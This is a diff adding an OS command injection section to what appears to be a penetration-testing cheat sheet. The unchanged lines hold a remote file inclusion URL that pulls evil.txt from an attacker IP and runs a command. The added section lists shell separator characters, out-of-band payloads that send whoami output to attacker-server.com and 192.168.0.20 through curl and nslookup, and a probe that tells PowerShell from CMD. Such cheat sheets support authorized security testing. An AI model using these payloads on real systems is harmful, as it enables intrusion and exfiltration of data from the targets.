@@ -289,3 +289,29 @@ python -m http.server 80
 ```
 http://site.com/menu.php?file=http://192.168.0.20/evil.txt&cmd=ipconfig
 ```
+
+## OS Command Injection
+-> Special Characters
+```
+& command
+&& command
+; command
+command %0A command
+| command
+|| command
+`command`
+$(command)
+```
+
+-> Out Of Band - OOB Exploitation
+```
+curl http://$(whoami).site.com/
+curl http://`whoami`.site.com/
+nslookup `whoami`.attacker-server.com &
+curl http://192.168.0.20/$(whoami)
+```
+
+-> Check if the commands are executed by PowerShell or CMD.
+```
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
